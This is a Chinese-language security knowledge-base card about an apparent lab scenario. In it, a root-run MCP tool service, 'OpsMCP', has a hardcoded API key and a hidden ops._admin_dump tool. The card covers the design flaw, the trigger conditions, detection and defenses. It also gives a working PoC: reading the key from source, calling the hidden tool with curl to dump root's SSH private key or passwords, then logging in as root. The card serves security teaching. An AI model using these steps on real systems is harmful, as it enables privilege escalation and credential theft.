---
id: ai-security-mcp-security-hidden-tool-hardcoded-key-root-credential
title: OpsMCP 隐藏工具与硬编码 API Key：以 root 运行的工具服务泄露 root SSH 私钥
type: scenario
domain: ai-security
path: ai-security/mcp-security
technique: mcp-hidden-tool-hardcoded-key
tags:
- mcp
- tool-authorization
- hidden-tool
- hardcoded-credential
- privilege-escalation
- root
- ssh-key
- flask
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V64
  verified_at: '2026-11-05T12:00:17+08:00'
  notes: 已对照原文完整 server.py 与图13-15核对：root 1066 运行 /opt/opsmcp/server.py；VALID_API_KEY=opsmcp_secret_key_4f5a6b7c8d9e0f1a、VISIBLE_TOOLS 与 HIDDEN_TOOLS（ops._admin_dump/ops._debug_mode）、/tools/call 校验 ALL_TOOLS、_admin_dump 读 /root/.ssh/id_rsa 均与源码一致；图14 curl 带该 Key 返回 root 私钥，图15 root shell。未验证点：PoC 未本机复跑；卡内响应示例为截断示意；无 CVE/版本。
url: /docs/ai-security/mcp-security/ai-security-mcp-security-hidden-tool-hardcoded-key-root-credential/
draft: false
kb_aliases:
- OpsMCP 隐藏工具
- ops._admin_dump
- 硬编码 X-API-Key
- MCP 工具不在 list 中仍可调用
- root 工具服务凭据泄露
- 本地 MCP 服务提权
---

## 一句话结论

以 root 运行的 OpsMCP 工具服务把 API Key 硬编码在源码中，`/tools/list` 只返回可见工具，但 `/tools/call` 校验的是包含隐藏工具的 `ALL_TOOLS`；任何能读源码或猜中 Key 的本地用户，都能调用隐藏的 `ops._admin_dump`，以 root 权限读取 `/root/.ssh/id_rsa` 并直接登录 root。

## 原理

- 服务用 Flask 监听 `127.0.0.1:5000`，以 root 身份运行；源码在 `/opt/opsmcp/server.py`，普通用户可读。
- 认证只比较请求头 `X-API-Key` 与硬编码常量 `VALID_API_KEY`；Key 直接写在源码里，读到源码即拿到 Key。
- `/tools/list` 只返回 `VISIBLE_TOOLS`（system_status、list_services、check_disk、view_logs），隐藏工具 `ops._admin_dump`、`ops._debug_mode` 不在列表里。
- 但 `/tools/call` 的校验是 `if tool_name not in ALL_TOOLS`，而 `ALL_TOOLS = {**VISIBLE_TOOLS, **HIDDEN_TOOLS}`；隐藏工具仍然可被调用，只是不展示。“不出现在工具列表”不是权限边界。
- `ops._admin_dump` 在 `confirm=true` 时按 `target` 读取敏感数据：`ssh_keys` 读取 `/root/.ssh/id_rsa`，`passwords` 返回 root/analyst/mcp-dev 口令，`tokens` 返回管理/服务 token。由于进程以 root 运行，文件读取不受权限限制。
- 攻击链：本地低权限 shell → 读 `/opt/opsmcp/server.py` 拿到硬编码 Key → 调用 `/tools/call` 的隐藏工具 → 得到 root 私钥 → SSH 登录 root。服务只监听 localhost，但本地用户可直接访问，localhost 不是信任边界。
- 这是 MCP 工具授权设计的典型反模式：把“隐藏”当“不可调用”，把“本地监听”当“可信”，把密钥写进源码。

## 触发条件

- 已获得目标主机低权限 shell。
- OpsMCP/类似工具服务以 root 运行并监听 localhost，普通用户可访问。
- 服务源码/配置可读，或 API Key 可被猜测/泄露。
- 隐藏工具未做额外授权，且能读取敏感文件或执行高权限操作。

## 利用步骤

1. `ps aux` 发现 root 运行的 `python3 /opt/opsmcp/server.py`，确认服务与端口。
2. 读取 `/opt/opsmcp/server.py`，找到 `VALID_API_KEY` 与 `HIDDEN_TOOLS` 定义。
3. 直接调用 `/tools/call`，带 `X-API-Key`，`name` 填 `ops._admin_dump`，`target=ssh_keys`、`confirm=true`。
4. 从响应中取出 root 私钥，保存为 `id_rsa` 并设置 600 权限。
5. `ssh -i id_rsa root@target` 登录 root；或改用 `target=passwords`/`tokens` 获取其他凭据。
6. 清理临时文件，评估是否需要轮换所有泄露凭据。

## PoC

```bash
# 1) 发现 root 运行的工具服务
ps aux | grep -i opsmcp
# root 1066 ... /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py

# 2) 读源码拿到硬编码 Key 与隐藏工具名
cat /opt/opsmcp/server.py | grep -E "VALID_API_KEY|HIDDEN_TOOLS|ops\._admin_dump"

# 3) 调用隐藏工具读取 root 私钥
curl -s -X POST http://127.0.0.1:5000/tools/call \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'

# 4) 保存私钥并登录 root
# echo -e '<root_private_key>' > id_rsa && chmod 600 id_rsa
ssh -i id_rsa root@target
```

```text
# 响应示例（截断）
{"note":"Emergency recovery key dump","root_private_key":"-----BEGIN OPENSSH PRIVATE KEY-----..."}
```

## 变体与关联

- 变体：`ops._debug_mode` 会返回隐藏工具列表，即使不知道隐藏工具名也可先调用它枚举。
- 变体：`target=passwords` 直接返回 root/analyst/mcp-dev 明文口令；`target=tokens` 返回管理 token，可用于其他服务。
- 变体：同类设计常见于内部运维面板、MCP 工具网关、管理 API：可见列表与可调用集合不一致，隐藏端点未做独立授权。
- 关联：[[ai-security-mcp-security-tool-idor-document-pii-leak]]（MCP 工具缺少对象级授权）、[[web-generic-auth-hardcoded-bip-cred-orgid-user-create]]（硬编码凭据）、[[pentest-privilege-escalation-credential-file-harvesting]]（本地凭据文件搜索）。
- 边界：服务不以 root 运行、源码不可读、API Key 改为强随机并从环境/密钥管理加载、隐藏工具做独立授权、或 localhost 访问被限制时，本手法不成立。

## 检测与防御

- 检测：审计工具服务的 `/tools/list` 与 `/tools/call` 可调用集合是否一致；监控对隐藏工具名（`_admin`、`_debug`、`dump` 等）的调用。
- 检测：监控普通用户读取 `/opt/opsmcp/server.py` 等 root 服务源码、以及从 localhost 调用管理 API 的行为。
- 防御：不要用“隐藏”代替授权；每个工具单独做权限校验，隐藏工具默认拒绝。
- 防御：API Key 不硬编码，使用环境变量/密钥管理并定期轮换；服务以最小权限用户运行，不直接读 root 文件。
- 加固：localhost 服务也要认证与来源校验；对敏感工具增加二次确认、审计日志与速率限制；把工具可调用集合纳入配置审计。
